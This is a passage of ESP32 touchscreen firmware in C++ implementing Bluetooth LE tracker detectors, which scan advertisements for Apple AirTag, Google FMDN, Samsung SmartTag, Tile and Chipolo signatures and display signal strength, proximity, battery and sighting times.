    drawGlitchTitle(58, "AIRTAG");
    tft.drawLine(0, 62, SCREEN_WIDTH, 62, HALEHOUND_HOTPINK);
}

static void drawTrackerList() {
    tft.fillRect(0, 63, SCREEN_WIDTH, SCREEN_HEIGHT - 63, HALEHOUND_BLACK);

    // Header line
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_VIOLET);
    tft.setCursor(5, 67);
    tft.printf("TRACKERS: %d", trackerCount);
    tft.setCursor(120, 67);
    tft.printf("SCANS: %d", totalScans);

    if (trackerCount == 0) {
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(10, 100);
        tft.print("No FindMy trackers detected");
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.setCursor(10, 120);
        tft.print("Scanning for AirTags,");
        tft.setCursor(10, 135);
        tft.print("FindMy accessories...");

        // Scanning animation
        if (scanning) {
            static int dots = 0;
            dots = (dots + 1) % 4;
            tft.setTextColor(HALEHOUND_HOTPINK);
            tft.setCursor(10, 160);
            tft.print("[*] SCANNING");
            for (int d = 0; d < dots; d++) tft.print(".");
        }
        return;
    }

    int y = 80;
    for (int i = 0; i < AT_MAX_VISIBLE && i + listStartIndex < trackerCount; i++) {
        int idx = i + listStartIndex;
        TrackedTag& t = trackers[idx];

        if (idx == currentIndex) {
            tft.fillRect(0, y - 2, SCREEN_WIDTH, AT_LINE_HEIGHT, HALEHOUND_DARK);
        }

        // RSSI bars
        drawRssiBar(5, y, t.rssi);

        // MAC address (shortened)
        uint16_t textCol = (idx == currentIndex) ? HALEHOUND_HOTPINK : HALEHOUND_MAGENTA;
        tft.setTextColor(textCol);
        tft.setCursor(28, y + 2);
        char shortMac[12];
        snprintf(shortMac, sizeof(shortMac), "%02X:%02X:%02X",
                 t.mac[3], t.mac[4], t.mac[5]);
        tft.print(shortMac);

        // Battery
        tft.setTextColor(batteryColor(t.battery));
        tft.setCursor(88, y + 2);
        tft.print(batteryStr(t.battery));

        // RSSI value
        tft.setTextColor(HALEHOUND_VIOLET);
        tft.setCursor(125, y + 2);
        tft.printf("%ddB", t.rssi);

        // Proximity
        tft.setTextColor(HALEHOUND_BRIGHT);
        tft.setCursor(175, y + 2);
        tft.print(proximityStr(t.rssi));

        // New indicator
        if (t.isNew) {
            tft.fillCircle(SCREEN_WIDTH - 8, y + 5, 3, HALEHOUND_HOTPINK);
        }

        y += AT_LINE_HEIGHT;
    }

    // Footer
    tft.setTextColor(HALEHOUND_GUNMETAL);
    tft.setCursor(5, SCREEN_HEIGHT - 12);
    tft.print("UP/DN=Nav SELECT=Details");
}

static void drawTrackerDetail() {
    tft.fillRect(0, 63, SCREEN_WIDTH, SCREEN_HEIGHT - 63, HALEHOUND_BLACK);

    if (trackerCount == 0 || currentIndex >= trackerCount) return;

    TrackedTag& t = trackers[currentIndex];
    int y = 72;

    // MAC
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y);
    tft.print("MAC: ");
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.print(macToStr(t.mac));
    y += 18;

    // Type
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y);
    tft.print("Type: ");
    tft.setTextColor(HALEHOUND_BRIGHT);
    tft.print("Apple FindMy Tracker");
    y += 18;

    // RSSI + Proximity
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y);
    tft.print("RSSI: ");
    tft.setTextColor(HALEHOUND_BRIGHT);
    tft.printf("%d dBm  (%s)", t.rssi, proximityStr(t.rssi));
    y += 18;

    // Large proximity bar
    int barWidth = map(constrain(t.rssi, -100, -30), -100, -30, 5, 200);
    tft.fillRect(10, y, barWidth, 10, HALEHOUND_HOTPINK);
    tft.drawRect(10, y, 200, 10, HALEHOUND_VIOLET);
    y += 18;

    // Battery
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y);
    tft.print("Battery: ");
    tft.setTextColor(batteryColor(t.battery));
    tft.print(batteryStr(t.battery));
    y += 18;

    // Status byte raw
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y);
    tft.print("Status: ");
    tft.setTextColor(HALEHOUND_VIOLET);
    tft.printf("0x%02X", t.statusByte);
    y += 18;

    // Time tracking
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y);
    tft.print("First seen: ");
    tft.setTextColor(HALEHOUND_BRIGHT);
    unsigned long elapsed = (millis() - t.firstSeen) / 1000;
    if (elapsed < 60) {
        tft.printf("%lus ago", elapsed);
    } else {
        tft.printf("%lum %lus ago", elapsed / 60, elapsed % 60);
    }
    y += 18;

    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y);
    tft.print("Last seen: ");
    tft.setTextColor(HALEHOUND_BRIGHT);
    unsigned long lastElapsed = (millis() - t.lastSeen) / 1000;
    tft.printf("%lus ago", lastElapsed);

    // Footer
    tft.setTextColor(HALEHOUND_GUNMETAL);
    tft.setCursor(5, SCREEN_HEIGHT - 12);
    tft.print("BACK=Return to list");
}

static void drawAlertFlash() {
    if (!alertFlash) return;
    if (millis() - alertStart > 800) {
        alertFlash = false;
        return;
    }
    // Flash border
    bool on = ((millis() - alertStart) / 100) % 2 == 0;
    uint16_t color = on ? HALEHOUND_HOTPINK : HALEHOUND_BLACK;
    tft.drawRect(0, 63, SCREEN_WIDTH, 3, color);
    tft.drawRect(0, SCREEN_HEIGHT - 15, SCREEN_WIDTH, 3, color);
}

// ═══════════════════════════════════════════════════════════════════════════
// SCANNING
// ═══════════════════════════════════════════════════════════════════════════

static void processScanResults(BLEScanResults results) {
    int count = results.getCount();
    bool foundNew = false;

    for (int i = 0; i < count; i++) {
        BLEAdvertisedDevice device = results.getDevice(i);

        if (!device.haveManufacturerData()) continue;

        std::string mfgData = device.getManufacturerData();
        if (mfgData.length() < 4) continue;

        // Check for Apple company ID (0x004C) + FindMy type (0x12) + length (0x19)
        uint8_t compLow = (uint8_t)mfgData[0];
        uint8_t compHigh = (uint8_t)mfgData[1];
        uint8_t type = (uint8_t)mfgData[2];
        uint8_t len = (uint8_t)mfgData[3];

        if (compLow != 0x4C || compHigh != 0x00) continue;  // Not Apple
        if (type != 0x12 || len != 0x19) continue;           // Not FindMy

        // Extract battery from status byte (bits 6-7)
        uint8_t statusByte = (mfgData.length() > 4) ? (uint8_t)mfgData[4] : 0;
        uint8_t battery = (statusByte >> 6) & 0x03;

        // Get MAC
        uint8_t mac[6];
        memcpy(mac, *device.getAddress().getNative(), 6);

        if (addOrUpdateTracker(mac, device.getRSSI(), battery, statusByte)) {
            foundNew = true;

            #if CYD_DEBUG
            Serial.printf("[AIRTAG] NEW tracker: %s RSSI:%d BAT:%s\n",
                          macToStr(mac).c_str(), device.getRSSI(), batteryStr(battery));
            #endif
        }
    }

    if (foundNew) {
        alertFlash = true;
        alertStart = millis();
    }
}

static void runScan() {
    scanning = true;
    totalScans++;

    BLEScanResults results = pAtScan->start(AT_SCAN_DURATION, false);
    processScanResults(results);
    pAtScan->clearResults();

    scanning = false;
    lastScanTime = millis();
}

// ═══════════════════════════════════════════════════════════════════════════
// SETUP AND LOOP
// ═══════════════════════════════════════════════════════════════════════════

void setup() {
    if (initialized) return;

    #if CYD_DEBUG
    Serial.println("[AIRTAG] Initializing detector...");
    #endif

    trackerCount = 0;
    currentIndex = 0;
    listStartIndex = 0;
    totalScans = 0;
    exitRequested = false;
    detailView = false;
    alertFlash = false;

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawIconBar();
    drawTitle();

    // Tear down WiFi before BLE init — frees radio + heap if WiFi was active
    WiFi.mode(WIFI_OFF);
    delay(50);

    // Init BLE
    releaseClassicBtMemory();
    BLEDevice::init("");
    delay(150);

    pAtScan = BLEDevice::getScan();
    if (!pAtScan) {
        Serial.println("[AIRTAG] ERROR: getScan() returned NULL");
        tft.setTextColor(HALEHOUND_HOTPINK);
        tft.setCursor(10, 100);
        tft.print("BLE INIT FAILED");
        exitRequested = true;
        return;
    }
    pAtScan->setActiveScan(false);  // Passive scan — don't alert the tracker
    pAtScan->setInterval(100);
    pAtScan->setWindow(99);

    initialized = true;

    // First scan
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, 100);
    tft.print("[*] Scanning for trackers...");
    runScan();
    drawTrackerList();

    // Consume any lingering touch from menu selection — prevents
    // isBackButtonTapped() in .ino from immediately exiting
    waitForTouchRelease();

    #if CYD_DEBUG
    Serial.println("[AIRTAG] Detector ready");
    #endif
}

void loop() {
    if (!initialized) return;

    touchButtonsUpdate();

    // Icon bar touch
    static unsigned long lastIconTap = 0;
    if (millis() - lastIconTap > 200) {
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty)) {
            if (ty >= 20 && ty <= 36) {
                if (tx >= 10 && tx < 26) {
                    if (detailView) {
                        detailView = false;
                        drawTrackerList();
                    } else {
                        exitRequested = true;
                    }
                    lastIconTap = millis();
                    return;
                }
                else if (tx >= 210 && tx < 226) {
                    runScan();
                    if (!detailView) drawTrackerList();
                    lastIconTap = millis();
                    return;
                }
            }
        }
    }

    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        if (detailView) {
            detailView = false;
            drawTrackerList();
        } else {
            exitRequested = true;
        }
        return;
    }

    if (detailView) {
        if (buttonPressed(BTN_LEFT)) {
            detailView = false;
            drawTrackerList();
        }
    } else {
        if (buttonPressed(BTN_UP)) {
            if (currentIndex > 0) {
                currentIndex--;
                if (currentIndex < listStartIndex) listStartIndex--;
                drawTrackerList();
            }
        }

        if (buttonPressed(BTN_DOWN)) {
            if (currentIndex < trackerCount - 1) {
                currentIndex++;
                if (currentIndex >= listStartIndex + AT_MAX_VISIBLE) listStartIndex++;
                drawTrackerList();
            }
        }

        if (buttonPressed(BTN_RIGHT) || buttonPressed(BTN_SELECT)) {
            if (trackerCount > 0) {
                detailView = true;
                drawTrackerDetail();
            }
        }

        // Touch to select device
        int touched = getTouchedMenuItem(80, AT_LINE_HEIGHT, min(AT_MAX_VISIBLE, trackerCount - listStartIndex));
        if (touched >= 0) {
            currentIndex = listStartIndex + touched;
            detailView = true;
            drawTrackerDetail();
        }
    }

    // Auto-rescan
    if (!scanning && millis() - lastScanTime >= AT_RESCAN_INTERVAL) {
        runScan();
        if (!detailView) drawTrackerList();
    }

    // Alert flash animation
    drawAlertFlash();
}

bool isExitRequested() { return exitRequested; }

void cleanup() {
    if (pAtScan) pAtScan->stop();
    BLEDevice::deinit(false);
    initialized = false;
    exitRequested = false;
    trackerCount = 0;

    #if CYD_DEBUG
    Serial.println("[AIRTAG] Cleanup complete");
    #endif
}

}  // namespace AirTagDetect


// ═══════════════════════════════════════════════════════════════════════════
// LUNATIC FRINGE IMPLEMENTATION - Multi-Platform BLE Tracker Detection
// Detects: Google FMDN (0xFEAA), Samsung SmartTag (0xFD5A), Tile (0xFEED),
//          Chipolo (0xFE33), Apple AirTag (0x004C type 0x12)
// Verified signatures from Bluetooth SIG Assigned Numbers & Google FMDN Spec
// ═══════════════════════════════════════════════════════════════════════════

namespace LunaticFringe {

#define TD_MAX_TRACKERS    20
#define TD_MAX_VISIBLE     10
#define TD_LINE_HEIGHT     18
#define TD_SCAN_DURATION   4
#define TD_RESCAN_INTERVAL 5000
#define TD_ICON_SIZE       16

// Tracker type enum
enum TrackerType : uint8_t {
    TRACKER_GOOGLE_FMDN = 0,
    TRACKER_SAMSUNG_TAG,
    TRACKER_TILE,
    TRACKER_CHIPOLO,
    TRACKER_APPLE_AIRTAG,
    TRACKER_UNKNOWN
};

// Tracked device struct
struct TrackedDevice {
    uint8_t mac[6];
    int rssi;
    TrackerType type;
    uint8_t statusByte;
    unsigned long firstSeen;
    unsigned long lastSeen;
    bool isNew;
};

static TrackedDevice devices[TD_MAX_TRACKERS];
static int deviceCount = 0;
static int currentIndex = 0;
static int listStartIndex = 0;

static bool initialized = false;
static bool exitRequested = false;
static bool scanning = false;
static bool detailView = false;
static bool alertFlash = false;
static unsigned long lastScanTime = 0;
static unsigned long alertStart = 0;
static int totalScans = 0;

static BLEScan* pTdScan = nullptr;

// Service data UUIDs — BT SIG Assigned Numbers verified
static BLEUUID UUID_FMDN((uint16_t)0xFEAA);     // Google LLC
static BLEUUID UUID_SAMSUNG((uint16_t)0xFD5A);   // Samsung Electronics Co., Ltd.
static BLEUUID UUID_TILE((uint16_t)0xFEED);       // Tile, Inc.
static BLEUUID UUID_CHIPOLO((uint16_t)0xFE33);    // CHIPOLO d.o.o.

// ═══════════════════════════════════════════════════════════════════════════
// HELPERS
// ═══════════════════════════════════════════════════════════════════════════

static const char* typeStr(TrackerType t) {
    switch (t) {
        case TRACKER_GOOGLE_FMDN:  return "Google FMDN";
        case TRACKER_SAMSUNG_TAG:  return "Samsung SmartTag";
        case TRACKER_TILE:         return "Tile";
        case TRACKER_CHIPOLO:      return "Chipolo";
        case TRACKER_APPLE_AIRTAG: return "Apple AirTag";
        default:                   return "Unknown";
    }
}

static const char* typeShort(TrackerType t) {
    switch (t) {
        case TRACKER_GOOGLE_FMDN:  return "FMDN";
        case TRACKER_SAMSUNG_TAG:  return "SMRT";
        case TRACKER_TILE:         return "TILE";
        case TRACKER_CHIPOLO:      return "CHIP";
        case TRACKER_APPLE_AIRTAG: return "ATAG";
        default:                   return "????";
    }
}

static uint16_t typeColor(TrackerType t) {
    switch (t) {
        case TRACKER_GOOGLE_FMDN:  return HALEHOUND_GREEN;
        case TRACKER_SAMSUNG_TAG:  return HALEHOUND_VIOLET;
        case TRACKER_TILE:         return HALEHOUND_BRIGHT;
        case TRACKER_CHIPOLO:      return HALEHOUND_MAGENTA;
        case TRACKER_APPLE_AIRTAG: return HALEHOUND_HOTPINK;
        default:                   return HALEHOUND_GUNMETAL;
    }
}

static String tdMacToStr(const uint8_t* mac) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(buf);
}

// Find existing device by MAC, returns index or -1
static int findDevice(const uint8_t* mac) {
    for (int i = 0; i < deviceCount; i++) {
        if (memcmp(devices[i].mac, mac, 6) == 0) return i;
    }
    return -1;
}

// Add or update a tracked device
static bool addOrUpdateDevice(const uint8_t* mac, int rssi, TrackerType type, uint8_t status) {
    int idx = findDevice(mac);
    if (idx >= 0) {
        // Update existing
        devices[idx].rssi = rssi;
        devices[idx].lastSeen = millis();
        devices[idx].isNew = false;
        return false;  // Not new
    }
    if (deviceCount >= TD_MAX_TRACKERS) return false;

    // Add new device
    memcpy(devices[deviceCount].mac, mac, 6);
    devices[deviceCount].rssi = rssi;
    devices[deviceCount].type = type;
    devices[deviceCount].statusByte = status;
    devices[deviceCount].firstSeen = millis();
    devices[deviceCount].lastSeen = millis();
    devices[deviceCount].isNew = true;
    deviceCount++;
    return true;  // New device found
}

// Estimate distance from RSSI
static const char* tdProximityStr(int rssi) {
    if (rssi > -40) return "< 1m";
    if (rssi > -55) return "1-3m";
    if (rssi > -70) return "3-8m";
    if (rssi > -85) return "8-15m";
    return "> 15m";
}

// Draw RSSI bar (5 segments)
static void tdDrawRssiBar(int x, int y, int rssi) {
    int bars = 0;
    if (rssi > -40) bars = 5;
    else if (rssi > -55) bars = 4;
    else if (rssi > -65) bars = 3;
    else if (rssi > -75) bars = 2;
    else if (rssi > -90) bars = 1;

    for (int i = 0; i < 5; i++) {
        int barH = 3 + i * 2;
        int barY = y + (12 - barH);
        uint16_t color = (i < bars) ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL;
        tft.fillRect(x + i * 4, barY, 3, barH, color);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// UI DRAWING
// ═══════════════════════════════════════════════════════════════════════════

static void tdDrawIconBar() {
    tft.drawLine(0, 19, SCREEN_WIDTH, 19, HALEHOUND_MAGENTA);
    tft.fillRect(0, 20, SCREEN_WIDTH, 16, HALEHOUND_GUNMETAL);
    tft.drawBitmap(10, 20, bitmap_icon_go_back, TD_ICON_SIZE, TD_ICON_SIZE, HALEHOUND_MAGENTA);
    tft.drawBitmap(210, 20, bitmap_icon_undo, TD_ICON_SIZE, TD_ICON_SIZE, HALEHOUND_MAGENTA);
    tft.drawLine(0, 36, SCREEN_WIDTH, 36, HALEHOUND_HOTPINK);
}

static void tdDrawTitle() {
    tft.drawLine(0, 38, SCREEN_WIDTH, 38, HALEHOUND_HOTPINK);
    drawGlitchTitle(50, "LUNATIC");
    drawGlitchStatus(66, "FRINGE", HALEHOUND_VIOLET);
    tft.drawLine(0, 72, SCREEN_WIDTH, 72, HALEHOUND_HOTPINK);
}

static void drawDeviceList() {
    tft.fillRect(0, 73, SCREEN_WIDTH, SCREEN_HEIGHT - 73, HALEHOUND_BLACK);

    // Header line
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_VIOLET);
    tft.setCursor(5, 77);
    tft.printf("FOUND: %d", deviceCount);
    tft.setCursor(120, 77);
    tft.printf("SCANS: %d", totalScans);

    if (deviceCount == 0) {
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(10, 100);
        tft.print("No trackers detected");
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.setCursor(10, 120);
        tft.print("Scanning for Google, Samsung,");
        tft.setCursor(10, 135);
        tft.print("Tile, Chipolo, Apple...");

        // Scanning animation
        if (scanning) {
            static int dots = 0;
            dots = (dots + 1) % 4;
            tft.setTextColor(HALEHOUND_HOTPINK);
            tft.setCursor(10, 160);
            tft.print("[*] SCANNING");
            for (int d = 0; d < dots; d++) tft.print(".");
        }
        return;
    }

    int y = 80;
    for (int i = 0; i < TD_MAX_VISIBLE && i + listStartIndex < deviceCount; i++) {
        int idx = i + listStartIndex;
        TrackedDevice& d = devices[idx];

        if (idx == currentIndex) {
            tft.fillRect(0, y - 2, SCREEN_WIDTH, TD_LINE_HEIGHT, HALEHOUND_DARK);
        }

        // RSSI bars
        tdDrawRssiBar(5, y, d.rssi);

        // Type label (short)
        tft.setTextColor(typeColor(d.type));
        tft.setCursor(28, y + 2);
        tft.print(typeShort(d.type));

        // MAC address (shortened)
        uint16_t textCol = (idx == currentIndex) ? HALEHOUND_HOTPINK : HALEHOUND_MAGENTA;
        tft.setTextColor(textCol);
        tft.setCursor(64, y + 2);
        char shortMac[12];
        snprintf(shortMac, sizeof(shortMac), "%02X:%02X:%02X",
                 d.mac[3], d.mac[4], d.mac[5]);
        tft.print(shortMac);

        // RSSI value
        tft.setTextColor(HALEHOUND_VIOLET);
        tft.setCursor(125, y + 2);
        tft.printf("%ddB", d.rssi);

        // Proximity
        tft.setTextColor(HALEHOUND_BRIGHT);
        tft.setCursor(175, y + 2);
        tft.print(tdProximityStr(d.rssi));

        // New indicator
        if (d.isNew) {
            tft.fillCircle(SCREEN_WIDTH - 8, y + 5, 3, HALEHOUND_HOTPINK);
        }

        y += TD_LINE_HEIGHT;
    }

    // Footer
    tft.setTextColor(HALEHOUND_GUNMETAL);
    tft.setCursor(5, SCREEN_HEIGHT - 12);
    tft.print("UP/DN=Nav SELECT=Details");
}

static void drawDeviceDetail() {
    tft.fillRect(0, 73, SCREEN_WIDTH, SCREEN_HEIGHT - 73, HALEHOUND_BLACK);

    if (deviceCount == 0 || currentIndex >= deviceCount) return;

    TrackedDevice& d = devices[currentIndex];
    int y = 82;

    // Type
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y);
    tft.print("Type: ");
    tft.setTextColor(typeColor(d.type));
    tft.print(typeStr(d.type));
    y += 18;

    // MAC
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y);
    tft.print("MAC: ");
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.print(tdMacToStr(d.mac));
    y += 18;

    // RSSI + Proximity
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y);
    tft.print("RSSI: ");
    tft.setTextColor(HALEHOUND_BRIGHT);
    tft.printf("%d dBm  (%s)", d.rssi, tdProximityStr(d.rssi));
    y += 18;

    // Large proximity bar
    int barWidth = map(constrain(d.rssi, -100, -30), -100, -30, 5, 200);
    tft.fillRect(10, y, barWidth, 10, HALEHOUND_HOTPINK);
    tft.drawRect(10, y, 200, 10, HALEHOUND_VIOLET);
    y += 18;

    // Battery
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y);
    tft.print("Battery: ");
    if (d.type == TRACKER_APPLE_AIRTAG) {
        // AirTag battery from status byte bits 6-7
        uint8_t bat = (d.statusByte >> 6) & 0x03;
        const char* batLabels[] = {"FULL", "MED", "LOW", "CRIT"};
        uint16_t batColors[] = {HALEHOUND_GREEN, HALEHOUND_MAGENTA, HALEHOUND_HOTPINK, (uint16_t)0xF800};
        tft.setTextColor(batColors[bat]);
        tft.print(batLabels[bat]);
    } else {
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.print("N/A");
    }
    y += 18;

    // Status byte raw
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y);
    tft.print("Status: ");
    tft.setTextColor(HALEHOUND_VIOLET);
    tft.printf("0x%02X", d.statusByte);
    y += 18;

    // Time tracking
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y);
    tft.print("First seen: ");
    tft.setTextColor(HALEHOUND_BRIGHT);
    unsigned long elapsed = (millis() - d.firstSeen) / 1000;
    if (elapsed < 60) {
        tft.printf("%lus ago", elapsed);
    } else {
        tft.printf("%lum %lus ago", elapsed / 60, elapsed % 60);
    }
    y += 18;

    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y);
    tft.print("Last seen: ");
    tft.setTextColor(HALEHOUND_BRIGHT);
    unsigned long lastElapsed = (millis() - d.lastSeen) / 1000;
    tft.printf("%lus ago", lastElapsed);

    // Footer
    tft.setTextColor(HALEHOUND_GUNMETAL);
    tft.setCursor(5, SCREEN_HEIGHT - 12);
    tft.print("BACK=Return to list");
}

static void tdDrawAlertFlash() {
    if (!alertFlash) return;
    if (millis() - alertStart > 800) {
        alertFlash = false;
        return;
    }
    // Flash border
    bool on = ((millis() - alertStart) / 100) % 2 == 0;
    uint16_t color = on ? HALEHOUND_HOTPINK : HALEHOUND_BLACK;
    tft.drawRect(0, 73, SCREEN_WIDTH, 3, color);
    tft.drawRect(0, SCREEN_HEIGHT - 15, SCREEN_WIDTH, 3, color);
}

// ═══════════════════════════════════════════════════════════════════════════
// SCANNING
// ═══════════════════════════════════════════════════════════════════════════

static void processScanResults(BLEScanResults results) {
    int count = results.getCount();
    bool foundNew = false;

    for (int i = 0; i < count; i++) {
        BLEAdvertisedDevice device = results.getDevice(i);

        uint8_t mac[6];
        memcpy(mac, *device.getAddress().getNative(), 6);
        int rssi = device.getRSSI();

        // Check service data for tracker UUIDs
        if (device.haveServiceData()) {
            BLEUUID sdUUID = device.getServiceDataUUID();
            std::string sd = device.getServiceData();

            // Google FMDN — UUID 0xFEAA, frame type 0x40 or 0x41
            if (sdUUID.equals(UUID_FMDN) && sd.length() >= 1) {
                uint8_t frameType = (uint8_t)sd[0];
                if (frameType == 0x40 || frameType == 0x41) {
                    if (addOrUpdateDevice(mac, rssi, TRACKER_GOOGLE_FMDN, frameType)) {
                        foundNew = true;
                        #if CYD_DEBUG
                        Serial.printf("[LUNATIC] NEW Google FMDN: %s RSSI:%d frame:0x%02X\n",
                                      tdMacToStr(mac).c_str(), rssi, frameType);
                        #endif
                    }
                    continue;
                }
            }

            // Samsung SmartTag — UUID 0xFD5A, byte 0 & 0xF8 == 0x10
            if (sdUUID.equals(UUID_SAMSUNG) && sd.length() >= 1) {
                uint8_t firstByte = (uint8_t)sd[0];
                if ((firstByte & 0xF8) == 0x10) {
                    if (addOrUpdateDevice(mac, rssi, TRACKER_SAMSUNG_TAG, firstByte)) {
                        foundNew = true;
                        #if CYD_DEBUG
                        Serial.printf("[LUNATIC] NEW Samsung SmartTag: %s RSSI:%d status:0x%02X\n",
                                      tdMacToStr(mac).c_str(), rssi, firstByte);
                        #endif
                    }
                    continue;
                }
            }

            // Tile — UUID 0xFEED, first bytes 0x02 0x00
            if (sdUUID.equals(UUID_TILE) && sd.length() >= 2) {
                if ((uint8_t)sd[0] == 0x02 && (uint8_t)sd[1] == 0x00) {
                    if (addOrUpdateDevice(mac, rssi, TRACKER_TILE, (uint8_t)sd[0])) {
                        foundNew = true;
                        #if CYD_DEBUG
                        Serial.printf("[LUNATIC] NEW Tile: %s RSSI:%d\n",
                                      tdMacToStr(mac).c_str(), rssi);
                        #endif
                    }
                    continue;
                }
            }

            // Chipolo — UUID 0xFE33, any service data present
            if (sdUUID.equals(UUID_CHIPOLO)) {
                uint8_t sb = (sd.length() > 0) ? (uint8_t)sd[0] : 0;
                if (addOrUpdateDevice(mac, rssi, TRACKER_CHIPOLO, sb)) {
                    foundNew = true;
                    #if CYD_DEBUG
                    Serial.printf("[LUNATIC] NEW Chipolo: %s RSSI:%d\n",
                                  tdMacToStr(mac).c_str(), rssi);
                    #endif
                }
                continue;
            }
        }

        // Apple AirTag — Manufacturer data 0x004C, type 0x12, len 0x19
        if (device.haveManufacturerData()) {
            std::string mfgData = device.getManufacturerData();
            if (mfgData.length() >= 4) {
                uint8_t compLow  = (uint8_t)mfgData[0];
                uint8_t compHigh = (uint8_t)mfgData[1];
                uint8_t type     = (uint8_t)mfgData[2];
                uint8_t len      = (uint8_t)mfgData[3];

                if (compLow == 0x4C && compHigh == 0x00 && type == 0x12 && len == 0x19) {
                    uint8_t statusByte = (mfgData.length() > 4) ? (uint8_t)mfgData[4] : 0;
                    if (addOrUpdateDevice(mac, rssi, TRACKER_APPLE_AIRTAG, statusByte)) {
                        foundNew = true;
                        #if CYD_DEBUG
                        Serial.printf("[LUNATIC] NEW Apple AirTag: %s RSSI:%d status:0x%02X\n",
                                      tdMacToStr(mac).c_str(), rssi, statusByte);
                        #endif
                    }
                }
            }
        }
    }

    if (foundNew) {
        alertFlash = true;
        alertStart = millis();
    }
}

static void tdRunScan() {
    scanning = true;
    totalScans++;

    BLEScanResults results = pTdScan->start(TD_SCAN_DURATION, false);
    processScanResults(results);
    pTdScan->clearResults();

    scanning = false;
    lastScanTime = millis();
}

// ═══════════════════════════════════════════════════════════════════════════
// SETUP AND LOOP
// ═══════════════════════════════════════════════════════════════════════════

void setup() {
    if (initialized) return;

    #if CYD_DEBUG
    Serial.println("[LUNATIC] Initializing multi-tracker detector...");
    #endif

    deviceCount = 0;
    currentIndex = 0;
    listStartIndex = 0;
    totalScans = 0;
    exitRequested = false;
    detailView = false;
    alertFlash = false;

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    tdDrawIconBar();
    tdDrawTitle();

    // Tear down WiFi before BLE init — frees radio + heap if WiFi was active
    WiFi.mode(WIFI_OFF);
    delay(50);

    // Init BLE
    releaseClassicBtMemory();
    BLEDevice::init("");
    delay(150);

    pTdScan = BLEDevice::getScan();
    if (!pTdScan) {
        Serial.println("[LUNATIC] ERROR: getScan() returned NULL");
        tft.setTextColor(HALEHOUND_HOTPINK);
        tft.setCursor(10, 100);
        tft.print("BLE INIT FAILED");
        exitRequested = true;
        return;
    }
    pTdScan->setActiveScan(true);  // Active scan for full advertisement data
    pTdScan->setInterval(100);
    pTdScan->setWindow(99);

    initialized = true;

    // First scan
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, 100);
    tft.print("[*] Scanning for trackers...");
    tdRunScan();
    drawDeviceList();

    // Consume any lingering touch from menu selection — prevents
    // isBackButtonTapped() in .ino from immediately exiting
    waitForTouchRelease();

    #if CYD_DEBUG
    Serial.println("[LUNATIC] Multi-tracker detector ready");
    #endif
}

void loop() {
    if (!initialized) return;

    touchButtonsUpdate();

    // Icon bar touch
    static unsigned long lastIconTap = 0;
    if (millis() - lastIconTap > 200) {
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty)) {
            if (ty >= 20 && ty <= 36) {
                if (tx >= 10 && tx < 26) {
                    if (detailView) {
                        detailView = false;
                        drawDeviceList();
                    } else {
                        exitRequested = true;
                    }
                    lastIconTap = millis();
                    return;
                }
                else if (tx >= 210 && tx < 226) {
                    tdRunScan();
                    if (!detailView) drawDeviceList();
                    lastIconTap = millis();
                    return;
                }
            }
        }
    }

    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        if (detailView) {
            detailView = false;
            drawDeviceList();
        } else {
            exitRequested = true;
        }
        return;
    }

    if (detailView) {
        if (buttonPressed(BTN_LEFT)) {
            detailView = false;
            drawDeviceList();
        }
    } else {
        if (buttonPressed(BTN_UP)) {
            if (currentIndex > 0) {
                currentIndex--;
                if (currentIndex < listStartIndex) listStartIndex--;
                drawDeviceList();
            }
        }

        if (buttonPressed(BTN_DOWN)) {
            if (currentIndex < deviceCount - 1) {
                currentIndex++;
                if (currentIndex >= listStartIndex + TD_MAX_VISIBLE) listStartIndex++;
                drawDeviceList();
            }
        }

        if (buttonPressed(BTN_RIGHT) || buttonPressed(BTN_SELECT)) {
            if (deviceCount > 0) {
                detailView = true;
                drawDeviceDetail();
            }
        }

        // Touch to select device
        int touched = getTouchedMenuItem(80, TD_LINE_HEIGHT, min(TD_MAX_VISIBLE, deviceCount - listStartIndex));
        if (touched >= 0) {
            currentIndex = listStartIndex + touched;
            detailView = true;
            drawDeviceDetail();
        }
    }

    // Auto-rescan
    if (!scanning && millis() - lastScanTime >= TD_RESCAN_INTERVAL) {
        tdRunScan();
        if (!detailView) drawDeviceList();
    }

    // Alert flash animation
    tdDrawAlertFlash();
}

bool isExitRequested() { return exitRequested; }

void cleanup() {
    if (pTdScan) pTdScan->stop();
    BLEDevice::deinit(false);
    initialized = false;
